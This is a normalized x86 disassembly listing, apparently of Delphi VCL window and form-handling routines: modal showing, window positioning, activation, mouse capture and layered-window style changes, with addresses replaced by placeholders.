call sub_46b6fc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d038
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46b6cc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a388
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44d894
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46b6f0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44d07c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46b6c0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_468290
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_468290
jmp r-xdata
sub_46a28d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46dc5c
call sub_4039a4
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468fe0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451374
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_453e1c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a388
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453e1c
call sub_464b10
mov ebx eax
sub_46a3d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_46a42c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038f0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_46a498
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403370
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46a4c4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46dc48
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403370
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_46a664
jmp r-xdata
mov eax ebx
call sub_46a700
mov dl 0x1
mov eax ebx
call sub_468250
jmp r-xdata
sub_46a568
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_467bdc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_467c28
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_46a5cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40363c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403370
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46a700
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a684
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46a6f2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a6f9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_468edc
sub_46a71c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a9e4
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44be94
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b70c
call sub_403928
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46cbbc
xor edx edx
push ebp
push sub_46a9c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_418324
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46bbec
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4649c0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push j_sub_4038f0#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_46a66c
xor edx edx
push ebp
push sub_46a904
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46a5cc
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46d9c8
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_453e1c
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a90b
mov eax [ ebp - 0x4 ]
call sub_46a664
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_46a90b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9af
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46bbec
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46bbec
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4182a0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418444
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_464a74
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_46a9f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a9f4
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_46aa64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_46a9f4
pop ecx
mov eax [ esi + 0x34 ]
call sub_45f4d4
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45f4e4
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_46aae8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45216c
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403370
sub_46ab0c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403370
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46ab3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46ab0c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46ab3c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46abb8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46ab0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46ab0c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46ab3c
pop ecx
test al al
je r-xdata
sub_46ac0c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403370
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46ac3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46ac0c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46ac3c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46acb8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46ac0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46ac0c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46ac3c
pop ecx
test al al
je r-xdata
sub_46ad0c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4182a8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_459ac8
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46ad60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46ad0c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403370
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46addc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_421158
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_46ae18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44db18
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44e7e8
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46ae60
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_453e1c
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_453e1c
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_453e1c
push eax
call RedrawWindow
sub_46afb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_465c6c
mov dl 0x5
mov eax ebx
call sub_467ad8
mov dl 0x1
mov eax ebx
call sub_4529f8
mov dl 0x3
mov eax ebx
call sub_467dd4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_46b01c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46b0f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4528b8
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_452724
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_44cb48
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d5a8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403fdc
mov eax [ ebp - 0xc ]
call sub_4041ac
push eax
mov eax [ ebp - 0xc ]
call sub_4043ac
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_44d5b8
mov eax [ ebp - 0xc ]
call sub_4041ac
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b0fa
lea eax [ ebp - 0xc ]
call sub_403eec
retn
mov dl 0x1
mov eax esi
call sub_467158
mov edx [ ebp - 0xc ]
mov eax esi
call sub_44d664
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404538
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46b120
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_450b4c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46687c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_450b10
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403370
inc ebp
dec edi
jne r-xdata
sub_46b16c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4528b8
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46b198
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4530c0
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46b1c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_469528
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_4528b8
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_453e1c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_453e1c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4528cc
or ecx 0xffffffff
mov dl 0x1
call sub_44dcdc
pop esi
pop ebx
retn
sub_46b258
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_453530
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44e7e8
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44cfd4
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403370
sub_46b2b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46b376
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
